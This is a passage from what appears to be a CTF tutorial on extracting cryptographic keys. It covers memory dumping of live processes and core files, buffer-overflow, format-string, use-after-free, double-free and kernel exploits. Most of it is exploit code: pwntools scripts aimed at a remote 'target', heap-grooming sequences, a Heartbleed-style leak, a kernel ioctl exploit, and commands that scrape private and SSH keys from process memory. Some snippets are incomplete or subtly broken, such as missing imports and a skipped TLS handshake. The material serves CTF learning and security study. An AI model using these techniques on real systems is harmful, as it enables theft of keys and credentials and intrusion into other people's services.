    for offset, key in keys:
        print(f"  {offset}: {key}")
```

**GDB Memory Extraction (Live Process)**

```bash
# Attach to running process
gdb -p <pid>

# Find heap memory regions
(gdb) info proc mappings

# Dump specific memory region
(gdb) dump memory heap.dump 0x7ffff7a00000 0x7ffff7b00000

# Search for patterns in memory
(gdb) find /b 0x7ffff7a00000, 0x7ffff7b00000, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d
# Searches for "-----" (PEM key marker)

# Extract data at address
(gdb) x/256bx 0x7ffff7a12345

# Detach without killing process
(gdb) detach
(gdb) quit
```

**Process Memory Scraping (Linux)**

```bash
# Dump process memory via /proc filesystem
cat /proc/<pid>/maps | grep heap
# Note heap address range, e.g., 0x55555555a000-0x55555557b000

# Extract heap memory
dd if=/proc/<pid>/mem of=heap.dump bs=4096 skip=$((0x55555555a000/4096)) count=$((0x21000/4096))

# Alternative: Use gcore
gcore -o process_dump <pid>

# Analyze core dump
strings process_dump.* | grep -a "PRIVATE KEY"
```

**OpenSSL-Specific Key Patterns**

```python
#!/usr/bin/env python3
import re

def find_openssl_structures(memory_file):
    """
    OpenSSL stores keys in specific structures (RSA, EVP_PKEY)
    """
    with open(memory_file, 'rb') as f:
        data = f.read()
    
    # RSA structure signature patterns
    # [Inference] Based on OpenSSL source code structure layouts
    rsa_patterns = [
        rb'RSA\x00',  # RSA structure identifier
        rb'\x00\x00\x00\x00[\x00-\xff]{4}\x00\x00\x00\x00',  # Typical pointer patterns
    ]
    
    for pattern in rsa_patterns:
        for match in re.finditer(pattern, data):
            offset = match.start()
            print(f"[+] Potential OpenSSL structure at {hex(offset)}")
            
            # Extract surrounding context
            context = data[max(0, offset-64):offset+256]
            
            # Look for large integers (key components)
            large_ints = re.findall(rb'[\x01-\xff][\x00-\xff]{31,}', context)
            if large_ints:
                print(f"    Found {len(large_ints)} large integer(s)")

if __name__ == "__main__":
    import sys
    find_openssl_structures(sys.argv[1])
```

**Key Material Identification Heuristics**

[Inference] Characteristics distinguishing key material from random data:

1. **Entropy**: Cryptographic keys exhibit high Shannon entropy (>7.5 bits/byte)
2. **Length**: Fixed lengths corresponding to standard key sizes (128, 192, 256, 512, 1024, 2048, 4096 bits)
3. **Context**: Adjacent to crypto library code or function calls
4. **Multiplicity**: Same key appears multiple times (key schedules, backups)
5. **Structure**: Keys in ASN.1 DER format have recognizable headers

**Testing Extracted Keys**

```bash
# Test if extracted data is valid RSA key
openssl rsa -in extracted_key.pem -text -noout

# Test symmetric key with known ciphertext
echo "known_ciphertext" | xxd -r -p > ciphertext.bin
openssl enc -aes-256-cbc -d -in ciphertext.bin -K <extracted_key_hex> -iv <known_iv>

# Verify public key matches
# Extract modulus from memory key
openssl rsa -in memory_key.pem -modulus -noout > modulus1.txt
# Compare with known public key
openssl rsa -pubin -in public_key.pem -modulus -noout > modulus2.txt
diff modulus1.txt modulus2.txt
```

**CTF-Specific Scenarios**

**Scenario 1: Core Dump Analysis**

```bash
# Given: core dump from crashed crypto application
file core.dump
# core.dump: ELF 64-bit LSB core file, x86-64

# Extract all strings, filter by key length
strings core.dump | awk 'length($0) == 64 || length($0) == 128' > potential_keys.txt

# Test each candidate
while read key; do
    echo "Testing: $key"
    echo "ciphertext_from_challenge" | xxd -r -p | openssl enc -aes-256-cbc -d -K $key -iv 00000000000000000000000000000000 2>/dev/null
done < potential_keys.txt
```

**Scenario 2: SSH Key in Memory**

```bash
# Search for SSH private key markers
strings memory.dump | grep -A 30 "BEGIN OPENSSH PRIVATE KEY"

# Extract complete key
grep -aPzo "-----BEGIN OPENSSH PRIVATE KEY-----.*?-----END OPENSSH PRIVATE KEY-----" memory.dump > ssh_key

# Fix formatting and test
chmod 600 ssh_key
ssh -i ssh_key user@target
```

**Scenario 3: Encrypted Container Password**

```python
#!/usr/bin/env python3
import re

def find_luks_keys(memory_dump):
    """
    LUKS master keys may remain in memory after unlock
    """
    with open(memory_dump, 'rb') as f:
        data = f.read()
    
    # LUKS uses 512-bit keys typically
    # Search for high-entropy 64-byte sequences
    candidates = []
    window_size = 64
    
    for i in range(0, len(data) - window_size):
        chunk = data[i:i+window_size]
        
        if calculate_entropy(chunk) > 7.5:
            # Additional heuristic: check for null byte padding
            if data[i+window_size:i+window_size+16] == b'\x00' * 16:
                candidates.append(chunk.hex())
    
    return candidates
```

**Memory Scraping Anti-Forensics Detection**

```bash
# Check if process uses mlock (prevents swapping)
cat /proc/<pid>/status | grep VmLck

# Check for secure memory allocation (indicates awareness)
ltrace -e malloc,calloc,mlock,madvise -p <pid>

# Detect memory zeroing patterns (key cleanup)
# [Inference] Repeated patterns of sequential zero writes suggest key wiping
```

**Tools for Memory Analysis**

```bash
# Install comprehensive toolkit
apt-get install volatility3 binwalk foremost bulk-extractor

# Bulk extractor for automated key extraction
bulk_extractor -o output_dir memory.dump
cat output_dir/aes_keys.txt

# Binwalk for embedded data
binwalk -e memory.dump

# Foremost for file carving
foremost -i memory.dump -o carved_files
```

**Important Notes**

- **[Inference]** Modern secure applications use `mlock()` and `madvise(MADV_DONTDUMP)` to prevent key material in core dumps
- **[Unverified]** Some implementations zero memory after use, but timing windows exist where keys remain accessible
- **Process state matters**: Keys in active memory are easier to extract than swapped-out pages

---

### Buffer Overflows Leaking Keys

Buffer overflows can leak adjacent memory containing cryptographic keys when input validation fails. Unlike traditional exploitation targeting code execution, key-leaking overflows focus on reading out-of-bounds memory regions where sensitive data resides.

**Vulnerability Patterns**

**Pattern 1: Stack Buffer Overflow Reading Adjacent Variables**

```c
// Vulnerable code example
void decrypt_message(char *input) {
    char buffer[64];
    unsigned char aes_key[32] = {0x01, 0x02, /* ... */};  // On stack
    
    strcpy(buffer, input);  // No bounds checking
    
    // If input > 64 bytes, overflows into aes_key
    printf("Buffer: %s\n", buffer);  // Leaks key if buffer overflowed
}
```

**Exploitation**

```bash
# Test for overflow
python3 -c "print('A' * 100)" | ./vulnerable_program

# Observe output - if more than 64 'A's printed, overflow occurred
# Additional bytes may contain key material

# Precise extraction
python3 << EOF
payload = b'A' * 64  # Fill buffer
payload += b'BBBB'   # Overflow marker
print(payload.hex())
EOF

# Send and capture output
echo "4141..." | xxd -r -p | ./vulnerable_program | xxd
```

**Pattern 2: Heap Overflow Into Adjacent Allocation**

```c
// Vulnerable code
struct crypto_context {
    char username[32];
    unsigned char private_key[256];
};

struct user_data {
    char description[64];
};

// Allocations may be adjacent in heap
struct crypto_context *ctx = malloc(sizeof(struct crypto_context));
struct user_data *user = malloc(sizeof(struct user_data));

// Overflow in description may reach ctx->private_key
gets(user->description);  // No bounds checking
```

**Heap Layout Analysis**

```bash
# GDB heap inspection
gdb ./vulnerable_program

# Set breakpoint after allocations
(gdb) break main
(gdb) run
(gdb) next  # Step to after malloc calls

# Examine heap layout
(gdb) info proc mappings
(gdb) find /b 0x<heap_start>, 0x<heap_end>, 0x41, 0x41, 0x41

# Determine distance between allocations
(gdb) print &ctx->private_key
(gdb) print &user->description
# Calculate offset
```

**Exploitation Script**

```python
#!/usr/bin/env python3
from pwn import *

def exploit_heap_overflow():
    # Connect to vulnerable service
    p = remote('target', 9999)
    # or: p = process('./vulnerable_program')
    
    # Determine offset to target key
    offset = 64  # Size of description buffer
    padding = 32  # Distance to key material
    
    # Craft payload
    payload = b'A' * offset  # Fill buffer
    payload += b'B' * padding  # Reach target
    
    # Send and read leaked data
    p.sendline(payload)
    response = p.recvall()
    
    # Extract key from response
    # [Inference] Key may be in binary or hex format
    leaked_data = response[offset+padding:]
    print(f"Leaked data: {leaked_data.hex()}")
    
    # Parse potential key material
    if len(leaked_data) >= 32:
        potential_key = leaked_data[:32]
        with open('leaked_key.bin', 'wb') as f:
            f.write(potential_key)

if __name__ == "__main__":
    exploit_heap_overflow()
```

**Pattern 3: Format String Vulnerability**

```c
// Vulnerable code
void log_message(char *user_input) {
    unsigned char secret_key[32] = {...};
    char log_buffer[256];
    
    snprintf(log_buffer, sizeof(log_buffer), user_input);  // Format string bug
    printf(log_buffer);  // Prints formatted string
}
```

**Exploitation**

```bash
# Leak stack contents
echo "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x" | ./vulnerable_program

# Leak specific stack positions
echo "%10\$x.%11\$x.%12\$x.%13\$x" | ./vulnerable_program

# Leak as string (if key contains printable chars)
echo "%10\$s" | ./vulnerable_program

# Automated format string exploitation
python3 << EOF
from pwn import *

p = process('./vulnerable_program')

# Leak stack values
payload = b'AAAA' + b'.%x' * 20
p.sendline(payload)
leaked = p.recvline()

# Parse leaked addresses
values = leaked.split(b'.')
print(f"Leaked values: {[v.decode() for v in values]}")
EOF
```

**Pattern 4: Integer Overflow Leading to Buffer Overflow**

```c
// Vulnerable code
void process_data(unsigned int length, char *data) {
    unsigned char crypto_key[32] = {...};
    
    // Integer overflow if length close to UINT_MAX
    char *buffer = malloc(length + 1);
    
    memcpy(buffer, data, length);  // Copies more than allocated
    buffer[length] = '\0';
    
    // Adjacent heap memory (potentially crypto_key) overwritten
}
```

**Exploitation**

```python
#!/usr/bin/env python3

def integer_overflow_exploit():
    # Trigger integer overflow
    # If length = 0xFFFFFFFF, then length + 1 = 0 (overflow)
    # malloc(0) returns small allocation
    # memcpy with 0xFFFFFFFF writes huge amount
    
    length = 0xFFFFFFFF
    payload = b'A' * 1000  # Will overflow into adjacent memory
    
    # Send to vulnerable service
    # Format depends on protocol
    packet = length.to_bytes(4, 'little') + payload
    
    with open('exploit_payload.bin', 'wb') as f:
        f.write(packet)

integer_overflow_exploit()
```

**Information Leak Through Error Messages**

```c
// Vulnerable code
void decrypt_file(char *filename) {
    unsigned char key[32] = {...};
    FILE *f = fopen(filename, "r");
    
    if (!f) {
        // Error message may leak key if it's on stack
        fprintf(stderr, "Error opening file: %s\n", filename);
        // If filename overflows, may print key bytes
    }
}
```

**Detection and Analysis**

```bash
# Detect buffer overflow vulnerabilities with fuzzing
apt-get install afl++ honggfuzz

# Compile with AddressSanitizer for detection
gcc -fsanitize=address -g vulnerable.c -o vulnerable

# Run with ASAN
./vulnerable < test_input.txt

# ASAN will report overflow with exact location
# Example output:
# ==12345==ERROR: AddressSanitizer: stack-buffer-overflow
# WRITE of size 100 at 0x7fff12345678
```

**Automated Exploitation with Pwntools**

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

def find_overflow_offset():
    """
    Determine exact offset to overwrite/leak target data
    """
    # Generate cyclic pattern
    pattern = cyclic(200)
    
    p = process('./vulnerable_program')
    p.sendline(pattern)
    
    # Capture crash or response
    try:
        response = p.recvall(timeout=2)
        
        # Find offset where key data appears
        if b'\x01\x02\x03\x04' in response:  # Known key prefix
            offset = response.index(b'\x01\x02\x03\x04')
            print(f"[+] Key leaks at offset: {offset}")
            return offset
    except:
        pass
    
    p.close()

def exploit_with_offset(offset):
    """
    Extract key using determined offset
    """
    p = remote('target', 9999)
    
    # Craft payload to trigger leak at exact offset
    payload = b'A' * offset
    p.sendline(payload)
    
    # Read leaked key
    data = p.recvuntil(b'\n')
    leaked_key = data[offset:offset+32]
    
    log.success(f"Leaked key: {leaked_key.hex()}")
    
    return leaked_key

if __name__ == "__main__":
    offset = find_overflow_offset()
    if offset:
        key = exploit_with_offset(offset)
```

**CTF-Specific Scenarios**

**Scenario 1: Heartbleed-Style Vulnerability**

[Inference] Based on CVE-2014-0160 (Heartbleed), which leaked memory through TLS heartbeat overflow:

```python
#!/usr/bin/env python3
import socket
import struct

def heartbleed_exploit(host, port):
    """
    Send malformed heartbeat request to leak memory
    """
    # TLS heartbeat payload structure
    # Type (1 byte) | Length (2 bytes) | Payload
    
    heartbeat_type = 0x01
    payload_length = 0x4000  # Claim 16KB payload
    actual_payload = b'A' * 16  # Only send 16 bytes
    
    # Server will respond with payload_length bytes
    # Including memory beyond actual_payload (leak)
    
    packet = struct.pack('!BH', heartbeat_type, payload_length)
    packet += actual_payload
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Complete TLS handshake first (simplified)
    # ...
    
    s.send(packet)
    leaked_memory = s.recv(payload_length)
    
    print(f"[+] Leaked {len(leaked_memory)} bytes")
    
    # Search for key patterns
    if b'-----BEGIN' in leaked_memory:
        print("[+] Found potential key in leaked memory")
    
    return leaked_memory
```

**Scenario 2: Off-by-One Null Byte Overflow**

```c
// Vulnerable code
void process_input(char *input, size_t len) {
    unsigned char key[32] = {...};
    char buffer[64];
    
    strncpy(buffer, input, sizeof(buffer));
    buffer[sizeof(buffer)] = '\0';  // Off-by-one: writes past buffer
    // Null byte overwrites first byte of key
}
```

**Exploitation**

```python
#!/usr/bin/env python3

def off_by_one_exploit():
    """
    Exploit off-by-one to partially corrupt key and leak it
    """
    # Fill buffer completely
    payload = b'A' * 64
    
    # The null byte will overwrite key[0]
    # If program prints error with corrupted key, we learn key structure
    
    # Send payload
    # Observe error message or behavior change
    # Key with modified first byte may be leaked in error handling
    
    pass
```

**Defense Mechanisms Detection**

```bash
# Check for stack canaries
readelf -s ./program | grep stack_chk_fail

# Check for FORTIFY_SOURCE
objdump -d ./program | grep __strcpy_chk

# Check for ASLR
cat /proc/sys/kernel/randomize_va_space
# 2 = full ASLR

# Bypass ASLR with information leak
# Leak stack/heap address first, then calculate offsets
```

**Important Considerations**

- **[Inference]** Buffer overflows leaking keys are most common in: input parsing, logging functions, error handlers, and serialization code
- **Stack layout matters**: Compiler may reorder variables; key may not be adjacent to overflow target
- **Partial leaks**: Even single bytes can reduce keyspace significantly
- **Multiple attempts**: Each connection may leak different memory regions (useful against ASLR)

---

### Use-After-Free in Crypto Operations

Use-After-Free (UAF) vulnerabilities occur when memory containing cryptographic keys is freed but pointers remain accessible, allowing access to freed memory that may still contain sensitive data or has been reallocated with attacker-controlled content. This is particularly dangerous in crypto contexts where key material persists in freed memory.

**Vulnerability Mechanism**

```c
// Vulnerable code pattern
struct crypto_session {
    unsigned char *session_key;
    int key_length;
};

struct crypto_session *session = malloc(sizeof(struct crypto_session));
session->session_key = malloc(32);
generate_key(session->session_key, 32);

// Session terminated
free(session->session_key);
free(session);

// UAF: session pointer still accessible
// If memory not overwritten, key still readable
printf("Old key: ");
for (int i = 0; i < 32; i++) {
    printf("%02x", session->session_key[i]);  // UAF vulnerability
}
```

**Exploitation Strategy 1: Reading Freed Memory**

```python
#!/usr/bin/env python3
from pwn import *

def uaf_leak_key():
    """
    Trigger UAF to read key from freed memory
    """
    p = remote('target', 9999)
    
    # Step 1: Create session (allocates key)
    p.sendline(b'CREATE_SESSION')
    p.recvuntil(b'Session created')
    
    # Step 2: Trigger free operation
    p.sendline(b'DESTROY_SESSION')
    p.recvuntil(b'Session destroyed')
    
    # Step 3: Access freed session (UAF)
    # If program has function to display session info
    p.sendline(b'SHOW_SESSION')
    
    # Freed memory may still contain key
    response = p.recvline()
    
    if len(response) >= 32:
        leaked_key = response[:32]
        log.success(f"Leaked key via UAF: {leaked_key.hex()}")
        return leaked_key

if __name__ == "__main__":
    uaf_leak_key()
```

**Exploitation Strategy 2: Memory Reuse for Controlled Content**

```c
// Vulnerable sequence
// 1. Allocate crypto context with key
struct crypto_ctx *ctx = malloc(sizeof(struct crypto_ctx));
generate_key(ctx->key, 32);

// 2. Free context (but program keeps pointer)
free(ctx);

// 3. Allocate user-controlled data of same size
char *user_data = malloc(sizeof(struct crypto_ctx));
read(socket, user_data, sizeof(struct crypto_ctx));

// 4. Use-after-free: ctx now points to user_data
// If program uses ctx->key, it uses attacker's data
decrypt(ciphertext, ctx->key);  // Uses attacker-controlled "key"
```

**Exploitation Script**

```python
#!/usr/bin/env python3
from pwn import *
import struct

def uaf_control_key():
    """
    Replace freed key memory with controlled content
    """
    p = remote('target', 9999)
    
    # Step 1: Create and destroy crypto session
    p.sendline(b'CREATE_SESSION')
    session_id = p.recvline()
    
    p.sendline(b'DESTROY_SESSION')
    p.recvuntil(b'destroyed')
    
    # Step 2: Immediately allocate same-sized object
    # Likely to reuse freed memory
    
    # Craft fake crypto context
    fake_key = b'\x00' * 32  # Null key for testing
    # Or use known key to decrypt challenge ciphertext
    
    fake_ctx = b'A' * 64  # Padding to reach key offset
    fake_ctx += fake_key
    fake_ctx += b'B' * (200 - len(fake_ctx))  # Fill structure
    
    p.sendline(b'ALLOCATE_BUFFER')
    p.send(struct.pack('<I', len(fake_ctx)))
    p.send(fake_ctx)
    
    # Step 3: Trigger use of freed session
    # Program uses our controlled key instead of original
    p.sendline(b'USE_SESSION')
    
    result = p.recvall()
    log.info(f"Result: {result}")
    
    return result

if __name__ == "__main__":
    uaf_control_key()
```

**GDB Analysis of UAF**

```bash
# Detect UAF with GDB
gdb ./vulnerable_program

# Set breakpoint at free
(gdb) break free
(gdb) run

# Note address being freed
(gdb) x/32xb $rdi
0x555555559260: 0x01 0x02 0x03 ...  # Key material

# Continue to UAF access
(gdb) break crypto_decrypt
(gdb) continue

# Check if same address is accessed
(gdb) x/32xb 0x555555559260
# If still contains key, UAF readable

# Check heap state
(gdb) heap chunks
```

**AddressSanitizer Detection**

```bash
# Compile with AddressSanitizer
gcc -fsanitize=address -g vulnerable.c -o vulnerable -lcrypto

# Run program
./vulnerable

# ASAN detects UAF:
# ==12345==ERROR: AddressSanitizer: heap-use-after-free
# READ of size 32 at 0x60200000eff0 thread T0
#     #0 in decrypt_function vulnerable.c:45
#     #1 in main vulnerable.c:120
# 
# 0x60200000eff0 is located 0 bytes inside of 32-byte region
# freed by thread T0 here:
#     #0 in free
#     #1 in destroy_session vulnerable.c:78
```

**Heap Grooming Technique**

```python
#!/usr/bin/env python3
from pwn import *

def heap_grooming_uaf():
    """
    Perform heap grooming to ensure our allocation reuses freed crypto memory
    """
    p = remote('target', 9999)
    
    # Step 1: Create predictable heap layout
    # Allocate multiple sessions
    sessions = []
    for i in range(10):
        p.sendline(b'CREATE_SESSION')
        sessions.append(p.recvline())
    
    # Step 2: Free target session (middle of heap)
    p.sendline(b'DESTROY_SESSION 5')
    
    # Step 3: Free surrounding sessions to merge chunks
    p.sendline(b'DESTROY_SESSION 4')
    p.sendline(b'DESTROY_SESSION 6')
    
    # Step 4: Allocate attacker object
    # Should land in freed crypto context location
    controlled_data = b'ATTACKER_KEY' + b'\x00' * 20
    p.sendline(b'ALLOCATE_DATA')
    p.send(controlled_data)
    
    # Step 5: Trigger UAF
    p.sendline(b'USE_SESSION 5')
    
    result = p.recvall()
    log.info(f"UAF exploitation result: {result}")

if __name__ == "__main__": 
	heap_grooming_uaf()
````

**Race Condition UAF**

```c
// Vulnerable threaded code
pthread_mutex_t session_lock;
struct crypto_session *global_session;

void *worker_thread(void *arg) {
    // Thread 1: Uses session
    pthread_mutex_lock(&session_lock);
    if (global_session) {
        encrypt_data(global_session->key, data);
    }
    pthread_mutex_unlock(&session_lock);
}

void cleanup_thread(void *arg) {
    // Thread 2: Frees session
    pthread_mutex_lock(&session_lock);
    if (global_session) {
        free(global_session->key);
        free(global_session);
        global_session = NULL;  // Race: may be too late
    }
    pthread_mutex_unlock(&session_lock);
}

// Race window: Thread 1 checks global_session before Thread 2 sets to NULL
// Thread 1 uses freed memory
````

**Exploitation**

```python
#!/usr/bin/env python3
from pwn import *
import threading
import time

def race_uaf_exploit():
    """
    Exploit race condition UAF by timing requests
    """
    p = remote('target', 9999)
    
    def spam_encrypt():
        """Send encryption requests rapidly"""
        for _ in range(1000):
            p.sendline(b'ENCRYPT:' + b'A' * 32)
            time.sleep(0.001)
    
    def trigger_cleanup():
        """Trigger session cleanup"""
        time.sleep(0.05)  # Let some encrypts queue
        p.sendline(b'CLEANUP_SESSION')
    
    # Start threads
    t1 = threading.Thread(target=spam_encrypt)
    t2 = threading.Thread(target=trigger_cleanup)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()
    
    # Check for UAF indicators in responses
    responses = p.recvall(timeout=2)
    
    if b'error' in responses.lower() or b'segfault' in responses.lower():
        log.success("Potential UAF triggered via race condition")
    
    # Parse leaked data
    leaked = re.findall(rb'[0-9a-f]{32,}', responses)
    if leaked:
        log.success(f"Leaked data: {leaked[0]}")

if __name__ == "__main__":
    race_uaf_exploit()
```

**Double-Free Vulnerability**

```c
// Vulnerable code: freeing same memory twice
struct crypto_session *session = create_session();

// First free
destroy_session(session);  // Calls free(session->key)

// Second free (forgot to null check)
cleanup_all_sessions();  // Calls free(session->key) again

// Double-free corrupts heap metadata
// Can be exploited to control allocations
```

**Double-Free Exploitation**

```python
#!/usr/bin/env python3
from pwn import *

def double_free_exploit():
    """
    Exploit double-free to control heap allocations
    [Inference] Double-free allows overwriting freed chunk metadata
    """
    p = remote('target', 9999)
    
    # Step 1: Trigger double-free
    p.sendline(b'CREATE_SESSION')
    session_id = p.recvline()
    
    p.sendline(b'DESTROY_SESSION')
    p.recvuntil(b'destroyed')
    
    p.sendline(b'CLEANUP_ALL')  # Triggers second free
    
    # Step 2: Exploit corrupted heap
    # Allocate data that will be placed in controlled location
    
    # [Inference] With glibc tcache double-free:
    # - First malloc returns freed chunk
    # - Second malloc can return arbitrary address if we control fd pointer
    
    # Allocate twice to get controlled memory
    p.sendline(b'ALLOCATE_BUFFER 32')
    buffer1 = p.recvline()
    
    # Write fake chunk metadata
    fake_chunk = p64(0x0000414141414141)  # Target address
    p.sendline(b'WRITE_BUFFER')
    p.send(fake_chunk)
    
    # Next allocation returns our target address
    p.sendline(b'ALLOCATE_BUFFER 32')
    
    # Now write to arbitrary location
    p.sendline(b'WRITE_BUFFER')
    p.send(b'CONTROLLED_DATA_HERE' + b'\x00' * 12)
    
    log.success("Arbitrary write achieved via double-free")

if __name__ == "__main__":
    double_free_exploit()
```

**Temporal Memory Analysis**

```python
#!/usr/bin/env python3
import time

def temporal_memory_leak():
    """
    Keys may persist in freed memory for extended periods
    Multiple leak attempts increase success rate
    """
    p = remote('target', 9999)
    
    # Create and destroy session
    p.sendline(b'CREATE_SESSION')
    p.recvuntil(b'created')
    
    p.sendline(b'DESTROY_SESSION')
    p.recvuntil(b'destroyed')
    
    # Attempt multiple leaks with increasing delays
    leaked_keys = []
    
    for delay in [0, 0.1, 0.5, 1.0, 5.0]:
        time.sleep(delay)
        
        p.sendline(b'LEAK_SESSION_INFO')
        try:
            data = p.recvline(timeout=2)
            
            # Extract potential key material
            potential_key = data[-32:]  # Last 32 bytes
            
            if potential_key not in leaked_keys:
                leaked_keys.append(potential_key)
                log.info(f"Leaked at t+{delay}s: {potential_key.hex()}")
        except:
            pass
    
    # Analyze leaked keys
    for i, key in enumerate(leaked_keys):
        log.info(f"Attempt {i}: entropy = {calculate_entropy(key):.2f}")
    
    return leaked_keys

def calculate_entropy(data):
    """Calculate Shannon entropy"""
    if len(data) == 0:
        return 0
    entropy = 0
    for x in range(256):
        p_x = data.count(bytes([x])) / len(data)
        if p_x > 0:
            entropy += -p_x * log2(p_x)
    return entropy

from math import log2
```

**Reference Counting UAF**

```c
// Vulnerable reference counting
struct crypto_context {
    unsigned char key[32];
    int refcount;
};

struct crypto_context *ctx = create_context();
ctx->refcount = 1;

void release_context(struct crypto_context *ctx) {
    ctx->refcount--;
    if (ctx->refcount == 0) {
        free(ctx);
    }
}

// Thread 1
release_context(ctx);  // refcount = 0, frees ctx

// Thread 2 (race condition)
if (ctx->refcount > 0) {  // Checks before Thread 1 frees
    use_key(ctx->key);  // UAF: ctx already freed
}
```

**CTF-Specific Detection Techniques**

```bash
# Detect UAF in binary
# Look for free() calls followed by use without null check

objdump -d ./program | grep -A 5 "call.*free"

# Check for common UAF patterns
# 1. Free without nulling pointer
# 2. Use of pointer after free in same function
# 3. Global pointers accessed after free

# Valgrind for UAF detection
valgrind --leak-check=full --show-leak-kinds=all ./program

# Example output:
# ==12345== Invalid read of size 32
# ==12345==    at 0x40123: decrypt_function (program.c:45)
# ==12345==  Address 0x520e040 is 0 bytes inside a block of size 32 free'd
```

**Fuzzing for UAF**

```python
#!/usr/bin/env python3
from pwn import *
import random

def fuzz_for_uaf():
    """
    Automated fuzzing to discover UAF conditions
    """
    commands = [
        b'CREATE_SESSION',
        b'DESTROY_SESSION',
        b'USE_SESSION',
        b'ENCRYPT_DATA',
        b'ALLOCATE_BUFFER',
        b'FREE_BUFFER',
        b'SHOW_INFO'
    ]
    
    crashes = []
    
    for iteration in range(1000):
        p = process('./vulnerable_program')
        
        # Random command sequence
        sequence = [random.choice(commands) for _ in range(10)]
        
        try:
            for cmd in sequence:
                p.sendline(cmd)
                p.recvline(timeout=0.5)
            
            p.close()
        except Exception as e:
            # Potential crash
            log.warning(f"Crash on iteration {iteration}: {sequence}")
            crashes.append(sequence)
    
    log.success(f"Found {len(crashes)} crashing sequences")
    
    # Analyze crashes for UAF patterns
    for seq in crashes:
        if b'DESTROY' in seq and b'USE' in seq:
            destroy_idx = seq.index(b'DESTROY_SESSION')
            use_indices = [i for i, cmd in enumerate(seq) if b'USE' in cmd]
            
            if any(idx > destroy_idx for idx in use_indices):
                log.critical(f"Potential UAF: {seq}")

if __name__ == "__main__":
    fuzz_for_uaf()
```

**Kernel UAF (Advanced)**

[Inference] In kernel-space crypto operations, UAF can be more severe:

```c
// Simplified kernel UAF example
struct kernel_crypto_session {
    unsigned char *key_material;
    struct crypto_tfm *tfm;
};

// User-space triggers session creation
int create_kernel_session(void) {
    struct kernel_crypto_session *sess = kmalloc(sizeof(*sess), GFP_KERNEL);
    sess->key_material = kmalloc(32, GFP_KERNEL);
    // ...
    return session_id;
}

// User-space triggers cleanup
void destroy_kernel_session(int id) {
    struct kernel_crypto_session *sess = find_session(id);
    kfree(sess->key_material);
    kfree(sess);
    // Session not removed from global list (UAF possible)
}
```

**Kernel UAF Exploitation**

```bash
# Trigger kernel UAF from user space
cat > exploit.c << 'EOF'
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define IOCTL_CREATE_SESSION _IOR('c', 1, int)
#define IOCTL_DESTROY_SESSION _IOW('c', 2, int)
#define IOCTL_USE_SESSION _IOWR('c', 3, int)

int main() {
    int fd = open("/dev/crypto_device", O_RDWR);
    
    // Create session
    int session_id;
    ioctl(fd, IOCTL_CREATE_SESSION, &session_id);
    
    // Destroy session
    ioctl(fd, IOCTL_DESTROY_SESSION, session_id);
    
    // Trigger UAF
    char buffer[32];
    ioctl(fd, IOCTL_USE_SESSION, session_id);
    
    // Read leaked kernel memory
    read(fd, buffer, 32);
    
    printf("Leaked kernel data: ");
    for(int i = 0; i < 32; i++) {
        printf("%02x", buffer[i]);
    }
    printf("\n");
    
    close(fd);
    return 0;
}
EOF

gcc exploit.c -o exploit
sudo ./exploit
```

**Memory Sanitizer Usage**

```bash
# Compile with Memory Sanitizer (Clang only)
clang -fsanitize=memory -g vulnerable.c -o vulnerable -lcrypto

# Run program
./vulnerable

# MSan detects use of uninitialized memory (related to UAF)
# ==12345==WARNING: MemorySanitizer: use-of-uninitialized-value
#     #0 in decrypt vulnerable.c:45
```

**Heap Exploitation Techniques Summary**

[Inference] Common heap exploitation techniques applicable to crypto UAF:

1. **Tcache poisoning** (glibc 2.26+): Overwrite tcache fd pointer to control next allocation
2. **Fastbin dup**: Double-free in fastbin to get overlapping chunks
3. **Unsorted bin attack**: Overwrite arbitrary location with large value
4. **House of Force**: Overflow top chunk size to control all future allocations
5. **House of Spirit**: Fake chunk to free arbitrary memory

**CTF Challenge Patterns**

**Pattern 1: Session Management UAF**

```python
#!/usr/bin/env python3
# Common CTF scenario: web service with session tokens

from pwn import *
import requests

def session_uaf_exploit():
    """
    Exploit UAF in session management to recover old session keys
    """
    base_url = "http://target:8080"
    
    # Create session
    r = requests.post(f"{base_url}/create_session")
    session_token = r.cookies['session']
    
    # Perform operations with session
    requests.get(f"{base_url}/encrypt", cookies={'session': session_token})
    
    # Destroy session
    requests.post(f"{base_url}/logout", cookies={'session': session_token})
    
    # Attempt to reuse destroyed session (UAF)
    # If session key not properly cleared, may still work
    r = requests.get(f"{base_url}/decrypt", cookies={'session': session_token})
    
    if r.status_code == 200:
        log.success("UAF: Session still usable after destruction")
        log.info(f"Response: {r.text}")
        
        # Extract flag or key material from response
        if 'flag{' in r.text:
            flag = re.search(r'flag\{[^}]+\}', r.text).group(0)
            log.success(f"Flag: {flag}")

if __name__ == "__main__":
    session_uaf_exploit()
```

**Pattern 2: Crypto Library UAF**

```c
// Common in custom crypto libraries
EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

// Improper cleanup
EVP_CIPHER_CTX_free(ctx);

// Later access (UAF)
EVP_EncryptUpdate(ctx, out, &outlen, in, inlen);  // Crash or leak
```

**Pattern 3: Smart Pointer Misuse**

```cpp
// C++ UAF through shared_ptr misuse
std::shared_ptr<CryptoContext> create_context() {
    auto ctx = std::make_shared<CryptoContext>();
    ctx->generate_key();
    return ctx;
}

// Vulnerability
CryptoContext *raw_ptr = create_context().get();  // shared_ptr destroyed
// raw_ptr now dangles

raw_ptr->encrypt(data);  // UAF
```

**Defense Detection in CTF**

```bash
# Check if binary has UAF protections

# 1. Check for _FORTIFY_SOURCE (some UAF protection)
objdump -s -j .rodata ./program | grep -i fortify

# 2. Check for custom allocators (may have guards)
nm ./program | grep -E "malloc|free|new|delete"

# 3. Check for reference counting (indicates manual memory management)
strings ./program | grep -i "refcount\|addref\|release"

# 4. Check for memory zeroization after free
objdump -d ./program | grep -A 3 "call.*free" | grep memset
```

**Important Notes**

- **[Inference]** UAF windows are typically short; exploitation often requires precise timing or heap grooming
- **[Unverified]** Some allocators (jemalloc, tcmalloc) have different UAF behaviors than glibc malloc
- **Heap randomization** (ASLR) complicates UAF exploitation but doesn't prevent key leaks from freed memory
- **Garbage collection** languages (Java, Go) are less susceptible but native code interfaces remain vulnerable

**Recommended Tools**

```bash
